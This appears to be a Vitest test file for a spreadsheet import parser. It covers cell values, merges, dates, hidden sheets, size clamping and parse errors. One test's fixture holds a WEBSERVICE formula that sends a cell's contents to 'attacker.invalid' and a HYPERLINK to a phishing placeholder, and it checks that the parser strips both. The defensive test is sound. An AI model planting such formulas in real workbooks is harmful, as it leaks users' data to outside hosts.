import { describe, it, expect } from 'vitest'
import ExcelJS from 'exceljs'
import { parseXlsx, XlsxParseError, MAX_IMPORT_COLS } from '../src/import/xlsx/parse.js'

/** Build a small workbook in-memory and return its .xlsx bytes as a Buffer. */
async function buildWorkbook(configure: (wb: ExcelJS.Workbook) => void): Promise<Buffer> {
  const wb = new ExcelJS.Workbook()
  configure(wb)
  const out = await wb.xlsx.writeBuffer()
  return Buffer.from(out as ArrayBuffer)
}

describe('parseXlsx', () => {
  it('parses cells, a formula, and a merge from a single sheet', async () => {
    const buf = await buildWorkbook((wb) => {
      const ws = wb.addWorksheet('Data')
      ws.getCell('A1').value = 'hi'
      ws.getCell('B1').value = 42
      ws.getCell('C1').value = true
      ws.getCell('A3').value = {
        formula: 'A1',
        result: 'hi',
      } as unknown as ExcelJS.CellValue
      ws.mergeCells('A2:B2')
      ws.getCell('A2').value = 'merged title'
    })

    const wbk = await parseXlsx(buf)
    expect(wbk.truncated).toBe(false)
    expect(wbk.sheets).toHaveLength(1)
    const sheet = wbk.sheets[0]!
    expect(sheet.name).toBe('Data')

    const cellAt = (row: number, col: number) =>
      sheet.cells.find((c) => c.row === row && c.col === col)
    expect(cellAt(0, 0)?.value).toBe('hi') // A1
    expect(cellAt(0, 1)?.value).toBe(42) // B1
    expect(cellAt(0, 2)?.value).toBe(true) // C1
    // A3 formula (leading '=' stripped)
    expect(cellAt(2, 0)?.formula).toBe('A1')

    // merge A2:B2 -> 0-based rows/cols
    expect(sheet.merges).toContainEqual({
      startRow: 1,
      startCol: 0,
      endRow: 1,
      endCol: 1,
    })
    // merged master A2 kept, slave B2 dropped
    expect(cellAt(1, 0)?.value).toBe('merged title')
    expect(cellAt(1, 1)).toBeUndefined()
  })

  it('drops externally active formulas while retaining their cached values', async () => {
    const buf = await buildWorkbook((wb) => {
      const ws = wb.addWorksheet('Unsafe formulas')
      ws.getCell('A1').value = { formula: 'WEBSERVICE("https://attacker.invalid/"&B1)', result: 'cached' } as unknown as ExcelJS.CellValue
      ws.getCell('A2').value = { formula: 'HYPERLINK("https://phishing.invalid","Click")', result: 'Click' } as unknown as ExcelJS.CellValue
      ws.getCell('A3').value = { formula: 'SUM(B1:B3)', result: 6 } as unknown as ExcelJS.CellValue
    })
    const parsed = await parseXlsx(buf)
    const cells = parsed.sheets[0]!.cells
    expect(cells.find((c) => c.row === 0)?.formula).toBeUndefined()
    expect(cells.find((c) => c.row === 0)?.value).toBe('cached')
    expect(cells.find((c) => c.row === 1)?.formula).toBeUndefined()
    expect(cells.find((c) => c.row === 1)?.value).toBe('Click')
    expect(cells.find((c) => c.row === 2)?.formula).toBe('SUM(B1:B3)')
  })

  it('emits a Date cell as an Excel serial and retains its number format', async () => {
    const when = new Date('2026-07-22T00:00:00.000Z')
    const buf = await buildWorkbook((wb) => {
      const ws = wb.addWorksheet('Dates')
      ws.getCell('A1').value = when
    })
    const wbk = await parseXlsx(buf)
    const cell = wbk.sheets[0]!.cells.find((c) => c.row === 0 && c.col === 0)
    // A serial plus the original number format survives XLSX -> sheet model ->
    // XLSX. An ISO string changes both the underlying value and Excel display.
    expect(cell?.value).toBe(46225)
    expect(cell?.style).toMatchObject({ n: { pattern: 'mm-dd-yy' } })
  })

  it('skips hidden worksheets', async () => {
    const buf = await buildWorkbook((wb) => {
      const visible = wb.addWorksheet('Visible')
      visible.getCell('A1').value = 'shown'
      const hidden = wb.addWorksheet('Hidden')
      hidden.getCell('A1').value = 'nope'
      hidden.state = 'hidden'
    })
    const wbk = await parseXlsx(buf)
    expect(wbk.sheets.map((s) => s.name)).toEqual(['Visible'])
  })

  it('clamps an oversized sheet and sets truncated', async () => {
    const buf = await buildWorkbook((wb) => {
      const ws = wb.addWorksheet('Wide')
      // Write a cell well beyond MAX_IMPORT_COLS to inflate the used range.
      ws.getCell(1, MAX_IMPORT_COLS + 50).value = 'far'
      ws.getCell('A1').value = 'near'
    })
    const wbk = await parseXlsx(buf)
    expect(wbk.truncated).toBe(true)
    const sheet = wbk.sheets[0]!
    // the far cell is beyond the clamp, so only the near cell survives
    expect(sheet.cells.some((c) => c.value === 'near')).toBe(true)
    expect(sheet.cells.some((c) => c.value === 'far')).toBe(false)
  })

  it('throws XlsxParseError("unreadable") on non-xlsx bytes', async () => {
    const junk = Buffer.from('this is not a workbook', 'utf8')
    await expect(parseXlsx(junk)).rejects.toMatchObject({
      name: 'XlsxParseError',
      reason: 'unreadable',
    })
    await expect(parseXlsx(junk)).rejects.toBeInstanceOf(XlsxParseError)
  })

  it('throws XlsxParseError("empty") on a workbook with no visible content', async () => {
    const buf = await buildWorkbook((wb) => {
      const hidden = wb.addWorksheet('Hidden')
      hidden.getCell('A1').value = 'nope'
      hidden.state = 'hidden'
    })
    await expect(parseXlsx(buf)).rejects.toMatchObject({
      name: 'XlsxParseError',
      reason: 'empty',
    })
  })
})
